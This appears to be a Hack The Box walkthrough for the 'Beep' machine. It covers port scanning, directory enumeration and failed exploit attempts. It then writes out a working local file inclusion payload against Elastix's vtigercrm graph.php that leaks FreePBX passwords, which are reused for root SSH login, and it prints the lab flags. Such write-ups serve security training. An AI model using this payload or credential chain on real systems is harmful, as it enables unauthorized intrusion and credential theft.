# Beep
## Reconnaissance

* Performed TCP and UDP scans using Nmap.
```
sudo nmap -sC -sS -sV -A 10.10.10.7
```
* The results of the Nmap show that TCP port 22, 25, 80, 110, 111, 143, 443, 993, 995, 3306, 4445 & 10000 are open. 
```
PORT   STATE SERVICE VERSION
PORT      STATE SERVICE    VERSION                                                                               
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)                                                            
| ssh-hostkey:                                                                                                   
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)                                                   
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)                                                   
25/tcp    open  smtp       Postfix smtpd                                                                         
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,    
80/tcp    open  http       Apache httpd 2.2.3                                                                    
| http-methods:                                                                                                  
|_  Supported Methods: GET HEAD POST OPTIONS                                                                     
|_http-title: Did not follow redirect to https://10.10.10.7/                                                     
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4                                          
|_pop3-capabilities: PIPELINING RESP-CODES LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) STLS AUTH-RESP-COD
E UIDL APOP TOP USER EXPIRE(NEVER)                                                                               
111/tcp   open  rpcbind    2 (RPC #100000)                                                                       
| rpcinfo:                                                                                                       
|   program version    port/proto  service                                                                       
|   100000  2            111/tcp   rpcbind                                                                       
|   100000  2            111/udp   rpcbind                                                                       
|   100024  1            875/udp   status                                                                        
|_  100024  1            878/tcp   status                                                                        
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4                                          
|_imap-capabilities: NO Completed UNSELECT CHILDREN NAMESPACE MAILBOX-REFERRALS CONDSTORE THREAD=REFERENCES THREA
D=ORDEREDSUBJECT IMAP4rev1 RENAME LITERAL+ URLAUTHA0001 X-NETSCAPE ATOMIC SORT OK IDLE MULTIAPPEND CATENATE ACL L
ISTEXT SORT=MODSEQ LIST-SUBSCRIBED BINARY RIGHTS=kxte STARTTLS IMAP4 QUOTA UIDPLUS ANNOTATEMORE ID               
443/tcp   open  ssl/https?                                                                                       
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeS
tate/countryName=--                                                                                              
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countr
yName=--                                                                                                         
| Public Key type: rsa                                                                                           
| Public Key bits: 1024                                                                                          
| Signature Algorithm: sha1WithRSAEncryption                                                                     
| Not valid before: 2017-04-07T08:22:08                                                                          
| Not valid after:  2018-04-07T08:22:08                                                                          
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8                                                                 
|_SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f                                                       
993/tcp   open  ssl/imap   Cyrus imapd                                                                           
|_imap-capabilities: CAPABILITY                                                                                  
995/tcp   open  pop3       Cyrus pop3d                                                                           
3306/tcp  open  mysql      MySQL (unauthorized)                                                                  
|_ssl-cert: ERROR: Script execution failed (use -d to debug)                                                     
|_ssl-date: ERROR: Script execution failed (use -d to debug)                                                     
|_sslv2: ERROR: Script execution failed (use -d to debug)                                                        
|_tls-alpn: ERROR: Script execution failed (use -d to debug)                                                     
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)                                             
4445/tcp  open  upnotifyp?                                                                                       
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)                                                         
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341                                            
| http-methods:                                                                                                  
|_  Supported Methods: GET HEAD POST OPTIONS                                                                     
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).                                         
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                            
```
* UDP Port 10000 is open too.
```
sudo nmap -p- -sU 10.10.10.7 --max-retries 0 -Pn
```
```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 20:24 EST
Warning: 10.10.10.7 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.7
Host is up (0.25s latency).
Not shown: 65240 open|filtered ports, 294 closed ports
PORT      STATE SERVICE
10000/udp open  ndmp
```
* Web enumeration
```
dirbuster for http://10.10.10.7 and https://10.10.10.7:443
Threads:30
extensions:php,aspx,asp,txt
not recursive
```
* Webscan Results
![image](https://raw.githubusercontent.com/kookiecrack/images/main/dirbuster-beep.png)
![image](https://raw.githubusercontent.com/kookiecrack/images/main/dirbuster2-beep.png)

## Delivery & Exploitation
* Google search and searchsploit for OpenSSH 4.3 exploits. Didn't find any suitable exploits.
* Tried Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection but didn't work.
* Tried metasploit's linux/pop3/cyrus_pop3d_popsubfolders. No session created.
* Failed to access MySQL Server
* Not vulnerable to [Webmin Exploit](https://raw.githubusercontent.com/jas502n/CVE-2019-15107/master/CVE_2019_15107.py)

* Successfully exploit LFI vulnerability of elastix
```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
```
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```
* Obtained password. Logged in with SSH
```
kali@kali:~/HTB/beep$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7 
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:FB:C7  
          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7277059 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4927428 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:864110985 (824.0 MiB)  TX bytes:875155054 (834.6 MiB)
          Interrupt:59 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:13823 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13823 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1430476 (1.3 MiB)  TX bytes:1430476 (1.3 MiB)

[root@beep ~]# cat /root/root.txt
d88e006123842106982acce0aaf453f0
[root@beep ~]# cd /home/
fanis/      spamfilter/ 
[root@beep ~]# cd /home/
fanis/      spamfilter/ 
[root@beep ~]# cat /home/fanis/user.txt 
aeff3def0c765c2677b94715cffa73ac
```

* Other exploitation methods [TBC]
```
gobuster dir -u https://10.10.10.7 -w /usr/share/seclists/Discovery/Web-Content/big.txt -k
```
```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/05 02:30:12 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/cgi-bin/ (Status: 403)
/configs (Status: 301)
/favicon.ico (Status: 200)
/help (Status: 301)
/images (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/mail (Status: 301)
/modules (Status: 301)
/panel (Status: 301)
/recordings (Status: 301)
/robots.txt (Status: 200)
/static (Status: 301)
/themes (Status: 301)
/var (Status: 301)
/vtigercrm (Status: 301)
```
